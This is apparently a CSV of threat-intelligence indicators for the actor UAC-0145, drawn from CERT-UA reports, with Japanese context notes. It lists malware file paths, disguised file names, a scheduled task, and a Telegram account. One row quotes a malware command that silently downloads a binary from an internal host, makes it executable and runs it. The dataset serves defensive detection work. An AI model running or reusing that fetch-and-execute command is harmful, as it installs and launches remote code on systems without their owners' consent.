schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--uac-0145,artifact--sha256:b5d3ef768de20c839582ae30f72c7221681c64195db73fec8cf7cadb2953d9ac,artifact-observation--sha256:d394f74dcd3edaa0984669cb8132a3b510b7251fe3b5d44b4fc9fa86cf3fac7b,file-path,%LOCALAPPDATA%\SystemHelper\python\,%localappdata%\systemhelper\python\,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-freakypoll""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,FREAKYPOLLの配置先ディレクトリ。,
1.0.0,actor--uac-0145,artifact--sha256:f57c4799f9e0adff200ec37abcbe1ab6871198a313c5e2c5e164fb803df13c55,artifact-observation--sha256:99e73ffc946d244780ca5417cbb3e0f94bf7433fa48fa29941ec6c7dddc61be6,file-path,%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Copilot Agent.vbs,%appdata%\microsoft\windows\start menu\programs\startup\copilot agent.vbs,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-ghettovibe""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,GHETTOVIBEのスタートアップ配置パス。,
1.0.0,actor--uac-0145,artifact--sha256:a82f69cfd5572b2e131cb9977aec1d0585da3f5ab145a4682fb4e319c907eb02,artifact-observation--sha256:795f8d4eca98f897cc892ce99febd62d219fc6c815a4cef8a4db9a482fe6fb55,file-path,/usr/libexec/timesyncd-check,/usr/libexec/timesyncd-check,confirmed,,unknown,unknown,not-stated,2026-08-08T00:00:00Z,source--certua-6318863-uac-0145,https://cert.gov.ua/article/6318863,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318863#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-fake-employment-sopravpn-2026""]","[""malware--uac-0145-sopravpn""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,Linux版SopraVPNが取得・実行する追加バイナリの配置先。,
1.0.0,actor--uac-0145,artifact--sha256:bd4a7c289bd8d330e1f10c7eccc863cd7974cdc1470e057e48fc03c524d01ec0,artifact-observation--sha256:a121f0188e2e55e328352c2ec55fac71d8516a02459daabf0c7de19d64b95e4b,command,{ command -v curl >/dev/null 2>&1 || apt install -y curl >/dev/null 2>&1; } && [ -f /usr/libexec/timesyncd-check ] || { curl -sf -o /usr/libexec/timesyncd-check http://files.sopra.local/timesyncd-check 2>/dev/null && chmod +x /usr/libexec/timesyncd-check 2>/dev/null; } && /usr/libexec/timesyncd-check >/dev/null 2>&1,{ command -v curl >/dev/null 2>&1 || apt install -y curl >/dev/null 2>&1; } && [ -f /usr/libexec/timesyncd-check ] || { curl -sf -o /usr/libexec/timesyncd-check http://files.sopra.local/timesyncd-check 2>/dev/null && chmod +x /usr/libexec/timesyncd-check 2>/dev/null; } && /usr/libexec/timesyncd-check >/dev/null 2>&1,confirmed,,unknown,unknown,not-stated,2026-08-08T00:00:00Z,source--certua-6318863-uac-0145,https://cert.gov.ua/article/6318863,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318863#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-fake-employment-sopravpn-2026""]","[""malware--uac-0145-sopravpn""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,Linux版SopraVPNが実行するコマンド。VPN経由でのみ到達するfiles.sopra.localから追加バイナリを取得する。,files.sopra.localはVPN内部でのみ解決される名前であり、公開DNS上の指標にならないためIOCへは採用しない。
1.0.0,actor--uac-0145,artifact--sha256:b79c518d45cc6ea69774ee435e0a0675051990b40bf03d163eeedecad2faf130,artifact-observation--sha256:adc5ad6baa5459a29d0b56560a60285877b311101a00eb54eeeaab49c4077325,scheduled-task,\Microsoft\Windows\ApplicationData\Microsoft,\microsoft\windows\applicationdata\microsoft,confirmed,,unknown,unknown,not-stated,2026-08-08T00:00:00Z,source--certua-6318863-uac-0145,https://cert.gov.ua/article/6318863,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318863#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-fake-employment-sopravpn-2026""]","[""malware--uac-0145-sopravpn""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,Windows版SopraVPNの復号PowerShellが作成するスケジュールタスク。,
1.0.0,actor--uac-0145,artifact--sha256:25da54135fd30fd29c7ad22e63d2c1bb20e2847f04bb456b60d6ced77fbd9017,artifact-observation--sha256:a917cc40c3ba604bb96d0ddcc235db6bd035dd41abbfe660839bbd63fca3a9df,other,@Sales_ManagerABG,@sales_managerabg,confirmed,,unknown,unknown,not-stated,2026-08-08T00:00:00Z,source--certua-6318863-uac-0145,https://cert.gov.ua/article/6318863,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318863#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-fake-employment-sopravpn-2026""]",[],[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,偽IT企業ATLAS Business GroupのTelegramアカウント。,
1.0.0,actor--uac-0145,artifact--sha256:ebf9d741ffaba4abeb128143cffba4c8e10514ad88e469ceb002d37b5b3b1bd3,artifact-observation--sha256:1bcc7336b713bbad030b75350e2d67065c46ef6ffdcf4b9e14b567f58d07e71b,sample-string,SymmetricKey,symmetrickey,confirmed,,unknown,unknown,not-stated,2026-08-08T00:00:00Z,source--certua-6318863-uac-0145,https://cert.gov.ua/article/6318863,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318863#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-fake-employment-sopravpn-2026""]","[""malware--uac-0145-sopravpn""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,SopraVPNがWireGuard設定へ追加した非標準オプション。値はAES-256-GCMのnonce・暗号文・認証タグをBASE64符号化したもの。,
1.0.0,actor--uac-0145,artifact--sha256:8ee5ee9c371681dc4fd388148164e33273a946493ee3d0b3e502f6eeed85938b,artifact-observation--sha256:624c8c7c779beec060ffc0d73434d3f0a0472437fc1a10f202e333ce67267c64,file-name,Work Copilot.vbs,work copilot.vbs,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-ghettovibe""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,ClickFix経路で設置されるVBS。,
1.0.0,actor--uac-0145,artifact--sha256:126111be411ab9ebd88eeda7de390cdb8feea30465661d450f5392ba1578c57f,artifact-observation--sha256:e7cec92dff956a255b6f83795fa60d8ffa3878c16a474a1c59edfec3ce022a54,file-name,update.cpython-314.pyc,update.cpython-314.pyc,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-freakypoll""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,FREAKYPOLLのコンパイル済みバイトコード。,
1.0.0,actor--uac-0145,artifact--sha256:4ecc8a465ccd10938fdb5c4c7997c0fdb0dce6a7d9df6297173589c8339bae7d,artifact-observation--sha256:555665ecac9095aaa4e4e8a0a841be44b2db2d314cf0e7e05a4db1f4a7814c95,file-name,ESET AV Remover.exe,eset av remover.exe,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-fluidleech""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,ESETの正規ツール名を騙る実行ファイル。updatus.exeを内包する。,
1.0.0,actor--uac-0145,artifact--sha256:4f6f6e93122e87a15c5b503a76e8b34f22c03229a869dfdb0ec2c80551e7c5d6,artifact-observation--sha256:312635eac75de9ed8451b95524941625f1972aaf1e013414693632bd4599eb50,file-name,updatus.exe,updatus.exe,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-fluidleech""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,FLUIDLEECHを内包する実行ファイル。,
1.0.0,actor--uac-0145,artifact--sha256:c86a7f0a60e44573c2843c07cff4c6a4d32847029184f8ba3d61828e0c3e3409,artifact-observation--sha256:f814179e9799c37458ba2648926b49e58a45bd1892e8ff5d5525fe955ede6be9,file-name,updatus.truncated.exe,updatus.truncated.exe,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-fluidleech""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,FLUIDLEECH本体。,
1.0.0,actor--uac-0145,artifact--sha256:e6b2b80991902166a3cb490da0ad061a969cbe28b6e9256aadd5691179249185,artifact-observation--sha256:c8436fad59c770bd38873afb0ffb7b17f2b32fd457bbcd69fd2f2882022873d9,file-name,Copilot Agent.vbs,copilot agent.vbs,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-ghettovibe""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,GHETTOVIBE。スタートアップへ配置される。,
1.0.0,actor--uac-0145,artifact--sha256:a96b7626b45253bfee2eb08076dd391f3474df4bc3e31ef165ae4892fa2cb7c3,artifact-observation--sha256:70642f5d69f82bc7e8c00854d112fbcf76ed97dd068013e35563ac6fcf403fbd,file-name,reshV1_2.ps1,reshv1_2.ps1,confirmed,,unknown,unknown,not-stated,2026-07-15T00:00:00Z,source--certua-6318437-uac-0145,https://cert.gov.ua/article/6318437,"{""repository"": null, ""commit"": null, ""path"": ""https://cert.gov.ua/article/6318437#Індикатори кіберзагроз / Хостові"", ""row"": null}","[""activity--uac-0145-initial-access-vectors-2026""]","[""malware--uac-0145-scoutcurl""]",[],[],1,false,high,TLP:CLEAR,primary-source-ioc-table,SCOUTCURL偵察スクリプト。,
